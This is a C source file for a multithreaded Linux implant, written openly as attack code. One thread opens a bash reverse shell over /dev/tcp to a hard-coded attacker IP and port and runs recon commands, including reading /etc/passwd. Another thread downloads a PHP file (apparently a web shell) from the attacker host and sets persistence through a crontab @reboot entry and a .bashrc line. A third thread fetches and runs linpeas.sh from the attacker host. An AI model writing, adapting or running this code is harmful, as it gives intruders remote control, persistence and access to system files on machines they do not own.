#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>

// process control
#include <sys/types.h>
#include <signal.h>
#include <sys/wait.h>

// network communication
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// misc.
#include <stdio.h>
#include <stdlib.h>

#include <pwd.h>
#include <pthread.h>  // pthread header for multithreading


const char* ATTACKER_IP = "192.168.1.175";  
const char* PORT = "4444";                   

void *a1(void *arg)
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 & whoami; uname -a; cat /etc/passwd | head -n 5; ip a'", ATTACKER_IP, PORT);
    system(cmd);  // Execute the command
    return NULL;
}

void *b2(void *arg)
{
    FILE *fp;
    char buffer[2048];
    int php_found = 0;
    
    fp = popen("php -v 2>/dev/null", "r");
    if (fp == NULL) {
        printf("Failed to run command.\n");
        return NULL;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, "PHP")) {
            php_found = 1;
            break;
        }
    }

    if (php_found) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "wget http://%s/mini.php", ATTACKER_IP);
        system(cmd);
    }

    // Setup persistence
    char PWD[1024];
    FILE *pwd_fp = popen("pwd", "r");
    if (pwd_fp) {
        fgets(PWD, sizeof(PWD), pwd_fp);
        pclose(pwd_fp);
    }

    PWD[strcspn(PWD, "\n")] = '\0';  // Fix this line

    snprintf(buffer, sizeof(buffer), "(crontab -l ; echo '@reboot %s') | crontab -", PWD);
    system(buffer);

    snprintf(buffer, sizeof(buffer), "echo '%s &' >> ~/.bashrc", PWD);
    system(buffer);

    return NULL;
}

void *c3(void *arg)
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "wget http://%s:8000/linpeas.sh", ATTACKER_IP);
    system(cmd);

    system("chmod +x linpeas.sh");
    system("./linpeas.sh");

    return NULL;
}

int main()
{
    pthread_t thread1, thread2, thread3;

    // Create threads for each function
    pthread_create(&thread1, NULL, a1, NULL);
    pthread_create(&thread2, NULL, b2, NULL);
    pthread_create(&thread3, NULL, c3, NULL);

    // Wait for all threads to finish
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    pthread_join(thread3, NULL);

    return 0;
}
